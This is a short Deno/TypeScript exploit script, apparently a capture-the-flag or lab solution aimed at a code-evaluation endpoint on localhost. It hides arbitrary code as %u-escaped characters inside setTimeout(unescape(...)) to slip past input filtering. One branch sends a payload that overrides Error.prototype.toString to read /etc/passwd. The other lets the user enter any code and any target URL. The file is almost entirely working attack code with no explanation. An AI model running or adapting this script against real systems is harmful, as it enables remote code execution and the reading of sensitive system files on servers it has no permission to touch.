function generatePayload(code: string) {
  return `setTimeout(unescape(/%u002a%u002a%u002f__PAYLOAD__%u002f/))`.replace(
    '__PAYLOAD__',
    [...code]
      .map(
        (c) =>
          // /^[a-zA-Z0-9+\-*/%()]+$/.test(c) ? c : `%u${c.charCodeAt(0).toString(16).padStart(4, '0')}`
          `%u${c.charCodeAt(0).toString(16).padStart(4, '0')}`
      )
      .join('')
  )
}

if (confirm('Full exploit?')) {
  await fetch('http://localhost:8000/eval', {
    method: 'POST',
    body: generatePayload(`
console.log(Error.prototype)
Error.prototype.toString = function() { return Deno.readTextFileSync('/etc/passwd') }
console.log(''+Error.prototype)
      `)
  })
    .then((res) => res.text())
    .then(console.log)
  await fetch('http://localhost:8000/eval', {
    method: 'POST',
    body: `eval()`
  })
    .then((res) => res.text())
    .then(console.log)
} else {
  const code = prompt('Enter your code:') || 'console.log("Hacked")'
  const finalCode = generatePayload(code)
  console.log('Final code:', finalCode)
  const target = prompt('Enter target URL:', 'http://localhost:8000/eval')
  if (!target) {
    console.log('No target URL provided')
    Deno.exit(0)
  }
  const resp = await fetch(target, {
    method: 'POST',
    body: finalCode
  })
  const text = await resp.text()
  console.log('Response:', text)
}
